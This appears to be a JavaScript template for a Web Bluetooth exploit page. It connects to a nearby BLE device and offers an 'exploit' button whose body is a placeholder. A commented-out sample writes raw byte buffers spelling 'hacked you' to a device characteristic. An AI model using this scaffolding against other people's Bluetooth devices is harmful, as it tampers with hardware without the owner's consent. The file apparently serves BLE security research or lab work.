var charExploit;
var targetDevice;

async function exploit_call() {
  /**
   * Sample Exploit from https://github.com/just2exploit/reflex/blob/master/assets/js/exploit.js

   var buffer1 = [0xbe, 0x06, 0x01, 0xfe, 0x0a, 0x68, 0x61, 0x63, 0x6b, 0x65, 0x64, 0x20];
   var buffer2 = [0xbe, 0x06, 0x02, 0xfe, 0x0f, 0x79, 0x6f, 0x75, 0x0a, 0xff, 0xff, 0xff, 0xff, 0xff];
   writedata1 = Uint8Array.from(buffer1);
   await charExploit.writeValue(writedata1);
   writedata2 = Uint8Array.from(buffer2);
   charExploit.writeValue(writedata2);

   */

  // Write your Exploit here!

  ChromeSamples.log("Exploited!");
}


function device_connect() {
  let serviceUuid = document.querySelector('#serviceUuid').value;
  let characteristicUuid = document.querySelector('#characteristicUuid').value

  navigator.bluetooth.requestDevice({
      acceptAllDevices: true,
      optionalServices: [serviceUuid]
    })
    .then(device => {
      targetDevice = device;
      return device.gatt.connect();
    })
    .then(server => {
      ChromeSamples.log("Device connected");
      return server.getPrimaryService(serviceUuid);
    })
    .then(service => {
      return service.getCharacteristic(characteristicUuid);
    })
    .then(characteristic => {
      charExploit = characteristic;
    })
    .catch(error => {
      ChromeSamples.log('Error! ' + error);
    });
}

function device_disconnect() {
  if (targetDevice.gatt.connected) {
    targetDevice.gatt.disconnect();
    ChromeSamples.log("Device disconnected");
  }
}

document.querySelector('button#connect').addEventListener('click', function (event) {
  event.stopPropagation();
  event.preventDefault();

  if (isWebBluetoothEnabled()) {
    device_connect();
    }
});

document.querySelector('button#exploit').addEventListener('click', function (event) {
  event.stopPropagation();
  event.preventDefault();

  if (isWebBluetoothEnabled()) {
    exploit_call();
  }
});

document.querySelector('button#disconnect').addEventListener('click', function (event) {
  event.stopPropagation();
  event.preventDefault();

  if (isWebBluetoothEnabled()) {
    device_disconnect();
  }
});